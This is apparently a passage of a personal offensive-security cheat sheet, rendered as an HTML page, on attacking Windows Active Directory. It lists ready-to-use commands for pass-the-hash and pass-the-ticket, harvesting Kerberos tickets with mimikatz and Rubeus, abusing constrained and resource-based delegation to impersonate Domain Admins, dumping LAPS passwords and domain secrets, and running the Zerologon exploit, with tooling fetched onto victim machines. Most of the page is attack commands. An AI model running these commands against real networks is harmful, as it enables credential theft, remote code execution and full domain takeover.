+<h2 id="overpass-the-hashpass-the-key-ptk">Overpass The Hash/Pass The Key (PTK)</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Request the TGT with hash</span>
+</span></span><span style="display:flex;"><span>python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -hashes <span style="color:#f92672">[</span>lm_hash<span style="color:#f92672">]</span>:&lt;ntlm_hash&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)</span>
+</span></span><span style="display:flex;"><span>python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt; -aesKey &lt;aes_key&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Request the TGT with password</span>
+</span></span><span style="display:flex;"><span>python getTGT.py &lt;domain_name&gt;/&lt;user_name&gt;:<span style="color:#f92672">[</span>password<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If not provided, password is asked</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set the TGT for impacket use</span>
+</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>&lt;TGT_ccache_file&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute remote commands with any of the following by using the TGT</span>
+</span></span><span style="display:flex;"><span>python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+</span></span><span style="display:flex;"><span>python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+</span></span><span style="display:flex;"><span>python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Ask and inject the ticket</span>
+</span></span><span style="display:flex;"><span>.\Rubeus.exe asktgt /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain_name&gt; /user<span style="color:#960050;background-color:#1e0010">:</span>&lt;user_name&gt; /rc4<span style="color:#960050;background-color:#1e0010">:</span>&lt;ntlm_hash&gt; /ptt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute a cmd in the remote machine</span>
+</span></span><span style="display:flex;"><span>.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
+</span></span></code></pre></div><h2 id="pass-the-ticket-ptt">Pass The Ticket (PTT)</h2>
+<ul>
+<li>Harvest tickets from Linux</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; grep default_ccache_name /etc/krb5.conf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If none return, default is FILE:/tmp/krb5cc_%{uid}.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># In case of file tickets, you can copy-paste (if you have permissions) for use them.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># In case of being KEYRING tickets, you can use tickey to get them:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   https://github.com/TarlogicSecurity/tickey</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   To dump current user tickets, if root, try to dump them all by injecting in other user processes</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   to inject, copy tickey in a reachable folder by all users</span>
+</span></span><span style="display:flex;"><span>cp tickey /tmp/tickey
+</span></span><span style="display:flex;"><span>/tmp/tickey -i
+</span></span></code></pre></div><ul>
+<li>Harvest tickets from Windows</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># mimikatz</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># sekurlsa::tickets /export</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Rubeus</span>
+</span></span><span style="display:flex;"><span>.\Rubeus dump
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># After dump with Rubeus tickets in base64, to write the in a file</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[IO.File]</span>::WriteAllBytes(<span style="color:#e6db74">&#34;ticket.kirbi&#34;</span>, <span style="color:#66d9ef">[Convert]</span>::FromBase64String(<span style="color:#e6db74">&#34;&lt;bas64_ticket&gt;&#34;</span>))
+</span></span></code></pre></div><ul>
+<li>To convert tickets between Linux/Windows format with ticket_converter.py:</li>
+</ul>
+<pre tabindex="0"><code>python ticket_converter.py ticket.kirbi ticket.ccache
+python ticket_converter.py ticket.ccache ticket.kirbi
+</code></pre><ul>
+<li>Using ticket in Linux</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Set the ticket for impacket use</span>
+</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>&lt;TGT_ccache_file_path&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute remote commands with any of the following by using the TGT</span>
+</span></span><span style="display:flex;"><span>python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+</span></span></code></pre></div><ul>
+<li>Using ticket in Windows</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Inject ticket with Mimikatz:</span>
+</span></span><span style="display:flex;"><span>mimikatz <span style="color:#75715e"># kerberos::ptt &lt;ticket_kirbi_file&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inject ticket with Rubeus:</span>
+</span></span><span style="display:flex;"><span>.\Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>&lt;ticket_kirbi_file&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute a cmd in the remote machine with PsExec:</span>
+</span></span><span style="display:flex;"><span>.\PsExec.exe -accepteula \\&lt;remote_hostname&gt; cmd
+</span></span></code></pre></div><h1 id="delegations">Delegations</h1>
+<ul>
+<li>Unconstrained delegation: Any service can be abused if one of their delegation entries is sensitive.</li>
+<li>Constrained delegation: Constrained entities can be abused if one of their delegation entries is sensitive.</li>
+<li>Resource-based constrained delegation (RBCD): Resource-based constrained entities can be abused if the entity itself is sensitive.</li>
+</ul>
+<h2 id="uncontrained-delegation">Uncontrained delegation</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Check for unconstrained delegation</span>
+</span></span><span style="display:flex;"><span>Get-ADComputer -Filter {TrustedForDelegation <span style="color:#f92672">-eq</span> $true <span style="color:#f92672">-and</span> primarygroupid <span style="color:#f92672">-eq</span> 515} -Properties trustedfordelegation,serviceprincipalname,description
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check if there is a tgt</span>
+</span></span><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;sekurlsa::tickets&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send a req to cache the tgt</span>
+</span></span><span style="display:flex;"><span>Invoke-WebRequest http<span style="color:#960050;background-color:#1e0010">:</span>//iis01.offense.local -UseDefaultCredentials -UseBasicParsing
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check again if the tgt is cached</span>
+</span></span><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;mimikatz::tickets /export&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Import the ticket</span>
+</span></span><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;kerberos::ptt C:\path\3c785-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Enter a session</span>
+</span></span><span style="display:flex;"><span>Enter-PSSession dc01
+</span></span></code></pre></div><h2 id="constrained-delegation">Constrained delegation</h2>
+<ul>
+<li>Assumption: compromised an account with constrained delegation configured</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Check for users with constrained delegation</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attribute msds-allowedtodelegateto identifies the SPNs of services the user is trusted to delegate to (impersonate other domain users) and authenticate to.</span>
+</span></span><span style="display:flex;"><span>Get-NetUser -TrustedToAuth
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># request delegation ticket</span>
+</span></span><span style="display:flex;"><span>.\Rubeus.exe tgtdeleg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ticket is the base64 ticket we get with `rubeus&#39;s tgtdeleg`</span>
+</span></span><span style="display:flex;"><span>Rubeus.exe s4u /ticket<span style="color:#960050;background-color:#1e0010">:</span>&lt;base64&gt; /impersonateuser<span style="color:#960050;background-color:#1e0010">:</span>administrator /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain&gt; /msdsspn<span style="color:#960050;background-color:#1e0010">:</span>&lt;spn&gt;/&lt;dc&gt; /dc<span style="color:#960050;background-color:#1e0010">:</span>&lt;dc&gt; /ptt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># check the ticket</span>
+</span></span><span style="display:flex;"><span>klist
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># try to access the system and confirm we have been delegated</span>
+</span></span><span style="display:flex;"><span>dir \\&lt;dc&gt;\c$
+</span></span></code></pre></div><ul>
+<li>Via computer account: If you have compromised a machine account (i.e SYSTEM level privileges on a machine) that is configured with constrained delegation, you can assume any identity in the AD domain and authenticate to services that the compromised machine is trusted to delegate to. e.g WS02 is trusted to delegate to DC01 for CIFS and LDAP services</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Check for computers with such delegation</span>
+</span></span><span style="display:flex;"><span>Get-NetComputer ws02 | select name, msds-allowedtodelegateto, useraccountcontrol | fl
+</span></span><span style="display:flex;"><span>Get-NetComputer ws02 | Select-Object -ExpandProperty msds-allowedtodelegateto | fl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># impersonate administrator@offense.local and access DC</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[Reflection.Assembly]</span>::LoadWithPartialName(<span style="color:#e6db74">&#39;System.IdentityModel&#39;</span>) | out-null
+</span></span><span style="display:flex;"><span>$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @(<span style="color:#e6db74">&#39;administrator&#39;</span>)
+</span></span><span style="display:flex;"><span>$idToImpersonate.Impersonate()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[System.Security.Principal.WindowsIdentity]</span>::GetCurrent() | select name
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ls \\&lt;dc&gt;\c$
+</span></span></code></pre></div><h2 id="resource-based-constrained-delegation-computer-object-takeover">Resource-based Constrained Delegation: Computer Object Takeover</h2>
+<ul>
+<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</a></li>
+<li>It&rsquo;s possible to gain code execution with elevated privileges on a remote computer if you have WRITE privilege on that computer&rsquo;s AD object.</li>
+<li>Kerberos Delegation vs Resource Based Kerberos Delegation
+<ul>
+<li>In unconstrained and constrained Kerberos delegation, a computer/user is told what resources it can delegate authentications to;</li>
+<li>In resource based Kerberos delegation, computers (resources) specify who they trust and who can delegate authentications to them.</li>
+</ul>
+</li>
+<li>Check if attackable</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Check if the user is allowed to create new computers, i.e ms-ds-machineaccountquota</span>
+</span></span><span style="display:flex;"><span>Get-DomainObject -Identity <span style="color:#e6db74">&#34;dc=offense,dc=local&#34;</span> -Domain offense.local
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># check DC is at least Windows Server 2012</span>
+</span></span><span style="display:flex;"><span>Get-DomainController
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check the target computer WS01 object must not have the attribute msds-allowedtoactonbehalfofotheridentity set:</span>
+</span></span><span style="display:flex;"><span>Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
+</span></span></code></pre></div><ul>
+<li>Attack</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># create a new computer object for our computer FAKE01. this is the computer that will be trusted by our target computer WS01 later</span>
+</span></span><span style="display:flex;"><span>import-module powermad
+</span></span><span style="display:flex;"><span>New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString <span style="color:#e6db74">&#39;&lt;pass&gt;&#39;</span> -AsPlainText -Force) -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check FAKE01 is created and the SID</span>
+</span></span><span style="display:flex;"><span>Get-DomainComputer fake01
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># computer SID: S-1-5-21-2552734371-813931464-1050690807-1154</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a new raw security descriptor for the FAKE01 computer principal:</span>
+</span></span><span style="display:flex;"><span>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span style="color:#e6db74">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&lt;SID&gt;)&#34;</span>
+</span></span><span style="display:flex;"><span>$SDBytes = New-Object byte[] ($SD.BinaryLength)
+</span></span><span style="display:flex;"><span>$SD.GetBinaryForm($SDBytes, 0)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Applying the security descriptor bytes to the target WS01 machine</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ensure the user is able to WRITE to the target AD object</span>
+</span></span><span style="display:flex;"><span>Get-DomainComputer ws01 | Set-DomainObject -Set @{<span style="color:#e6db74">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span>=$SDBytes} -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check msds-allowedtoactonbehalfofotheridentity is set</span>
+</span></span><span style="display:flex;"><span>Get-DomainComputer ws01 -Properties <span style="color:#e6db74">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># test if the security descriptor assigned to ws01 in msds-allowedtoactonbehalfofotheridentity attribute refers to the fake01$ machine:</span>
+</span></span><span style="display:flex;"><span>(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).Discretionary
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Note that the SID should refer to fake01$ machine&#39;s SID </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># generate the RC4 hash of the password we set for the FAKE01 computer:</span>
+</span></span><span style="display:flex;"><span>.\Rubeus.exe hash /password<span style="color:#960050;background-color:#1e0010">:</span>&lt;pass&gt; /user<span style="color:#960050;background-color:#1e0010">:</span>fake01 /domain<span style="color:#960050;background-color:#1e0010">:</span>&lt;domain&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Once we have the hash, we can execute the attack by requesting a kerberos ticket for fake01$ with ability to impersonate user spotless who is a Domain Admin:</span>
+</span></span><span style="display:flex;"><span>.\Rubeus.exe s4u /user<span style="color:#960050;background-color:#1e0010">:</span>fake01$ /domain<span style="color:#960050;background-color:#1e0010">:</span>offense.local /rc4<span style="color:#960050;background-color:#1e0010">:</span>&lt;hash&gt; /impersonateuser<span style="color:#960050;background-color:#1e0010">:</span>spotless /msdsspn<span style="color:#960050;background-color:#1e0010">:</span>http/ws01 /altservice<span style="color:#960050;background-color:#1e0010">:</span>cifs,host /ptt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Check that we now have access</span>
+</span></span><span style="display:flex;"><span>ls \\ws01\c$
+</span></span><span style="display:flex;"><span>.\PsExec.exe \\ws01 cmd
+</span></span></code></pre></div><h1 id="ldap-389">ldap: 389</h1>
+<ul>
+<li><a href="https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737">https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737</a></li>
+</ul>
+<pre tabindex="0"><code>&gt; ldapsearch -x -H ldap://&lt;domain&gt; -D &#39;support\ldap&#39; -w &#39;&lt;pass&gt;&#39; -b &#34;CN=Users,DC=support,DC=htb&#34;
+</code></pre><h2 id="ldap-domain-search">ldap domain search</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$domainObj = <span style="color:#66d9ef">[System.DirectoryServices.ActiveDirectory.Domain]</span>::GetCurrentDomain()
+</span></span><span style="display:flex;"><span>$PDC = ($domainObj.PdcRoleOwner).Name
+</span></span><span style="display:flex;"><span>$SearchString = <span style="color:#e6db74">&#34;LDAP://&#34;</span>
+</span></span><span style="display:flex;"><span>$SearchString += $PDC + <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>$DistinguishedName = <span style="color:#e6db74">&#34;DC=</span>$($domainObj.Name.Replace(<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;,DC=&#39;</span>))<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>$SearchString += $DistinguishedName
+</span></span><span style="display:flex;"><span>$Searcher = New-Object System.DirectoryServices.DirectorySearcher(<span style="color:#66d9ef">[ADSI]</span>$SearchString)
+</span></span><span style="display:flex;"><span>$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+</span></span><span style="display:flex;"><span>$Searcher.SearchRoot = $objDomain
+</span></span><span style="display:flex;"><span>$Searcher.<span style="color:#66d9ef">filter</span>=<span style="color:#e6db74">&#34;serviceprincipalname=*http*&#34;</span>
+</span></span><span style="display:flex;"><span>$Result = $Searcher.FindAll()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Foreach</span>($obj <span style="color:#66d9ef">in</span> $Result) { <span style="color:#66d9ef">Foreach</span>($prop <span style="color:#66d9ef">in</span> $obj.Properties) { $prop } }
+</span></span></code></pre></div><h1 id="ntlm-leak">NTLM leak</h1>
+<ul>
+<li><a href="https://github.com/Gl3bGl4z/All_NTLM_leak">https://github.com/Gl3bGl4z/All_NTLM_leak</a></li>
+<li><a href="https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html">https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Convert password to ntlm hash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># NTLM hash generator: https://codebeautify.org/ntlm-hash-generator</span>
+</span></span><span style="display:flex;"><span>&gt; python -c <span style="color:#e6db74">&#39;import hashlib,binascii; print binascii.hexlify(hashlib.new(&#34;md4&#34;, &#34;&lt;password&gt;&#34;.encode(&#34;utf-16le&#34;)).digest())&#39;</span>
+</span></span><span style="display:flex;"><span>&gt; iconv -f ASCII -t UTF-16LE &lt;<span style="color:#f92672">(</span>printf <span style="color:#e6db74">&#34;password&#34;</span><span style="color:#f92672">)</span> | openssl dgst -md4
+</span></span></code></pre></div><h1 id="laps-admin-password">LAPS admin password</h1>
+<ul>
+<li>Need an account that can write to the target group, ie WriteOwner</li>
+<li>Add a user to a group that has ReadLAPSPassword permission</li>
+<li>Read the Administrator&rsquo;s LAPS password</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Collect AD forest info using bloodhound, locate the user and the target group</span>
+</span></span><span style="display:flex;"><span>&gt; bloodhound-python -c All -u &lt;user&gt; -p &lt;pass&gt; -dc &lt;dc&gt; -d &lt;domain&gt; -ns &lt;ns&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connect via a user on the target</span>
+</span></span><span style="display:flex;"><span>&gt; evil-winrm -i &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt;
+</span></span></code></pre></div><ul>
+<li>On Windows target</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Upload and import module to the victim machine</span>
+</span></span><span style="display:flex;"><span>wget https<span style="color:#960050;background-color:#1e0010">:</span>//raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+</span></span><span style="display:flex;"><span>upload PowerView.ps1
+</span></span><span style="display:flex;"><span>Import-Module .\PowerView.ps1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Use the users that is an account operator to achieve the &#34;adding user to group&#34; operation</span>
+</span></span><span style="display:flex;"><span>$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;&lt;pass&gt;&#39;</span> -AsPlainText -Force
+</span></span><span style="display:flex;"><span>$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;&lt;domain&gt;\&lt;user&gt;&#39;</span>, $SecPassword)
+</span></span><span style="display:flex;"><span>Add-DomainObjectAcl -Credential $Cred -TargetIdentity <span style="color:#e6db74">&#34;&lt;group&gt;&#34;</span> -principalidentity <span style="color:#e6db74">&#34;&lt;domain&gt;\&lt;user&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>Add-DomainGroupMember -identity <span style="color:#e6db74">&#34;&lt;group&gt;&#34;</span> -members <span style="color:#e6db74">&#34;&lt;domain&gt;\&lt;user&gt;&#34;</span> -credential $Cred
+</span></span></code></pre></div><ul>
+<li>On kali</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># lapsdumper</span>
+</span></span><span style="display:flex;"><span>&gt; lapsdumper -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -l &lt;dc-ip&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># or</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://www.n00py.io/2020/12/dumping-laps-passwords-from-linux/</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://chowdera.com/2022/04/202204042238391625.html</span>
+</span></span><span style="display:flex;"><span>&gt; wget https://raw.githubusercontent.com/n00py/LAPSDumper/main/laps.py
+</span></span><span style="display:flex;"><span>&gt; python3 laps.py -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># With the password that results connect with evil-winrm as administrator</span>
+</span></span><span style="display:flex;"><span>&gt; evil-winrm -i &lt;domain&gt; -u Administrator -p <span style="color:#e6db74">&#39;&lt;dc:pass&gt;&#39;</span>
+</span></span></code></pre></div><h1 id="secretdump">secretdump</h1>
+<ul>
+<li>DA privilege needed to dump the secrets</li>
+<li>Retrieve all of the password hashes (if synced with the domain controller)</li>
+</ul>
+<pre tabindex="0"><code>&gt; secretsdump.py
+</code></pre><h1 id="zerologon">Zerologon</h1>
+<pre tabindex="0"><code># Setup
+&gt; git clone https://github.com/risksense/zerologon.git
+
+# Exploit
+&gt; python3 set_empty_pw.py &lt;DC_NETBIOS_NAME&gt; &lt;DC_IP_ADDR&gt;
+&gt; secretsdump.py -hashes :&lt;ntlm&gt; &#39;&lt;DOMAIN&gt;/&lt;DC_NETBIOS_NAME&gt;@&lt;dc_ip_addr&gt;&#39;
+&gt; wmiexec.py &lt;domain&gt;/Administrator@&lt;ip&gt; -hashes &lt;hashes&gt;
+</code></pre><ul>
+<li>crack original ntlm hash</li>
+</ul>
+<pre tabindex="0"><code>&gt; secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+</code></pre><ul>
+<li>Reinstall the hashes to the domain. Reinstalling the original hash is necessary for the DC to continue to operate normally.</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 reinstall_original_pw.py &lt;DC_NETBIOS_NAME&gt; &lt;DC_IP_ADDR&gt; &lt;ORIG_NT_HASH&gt;
+</code></pre><h1 id="ref">ref</h1>
+<ul>
+<li><a href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html</a></li>
+<li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></li>
+<li><a href="https://blog.harmj0y.net/activedirectory/s4u2pwnage/">https://blog.harmj0y.net/activedirectory/s4u2pwnage/</a></li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
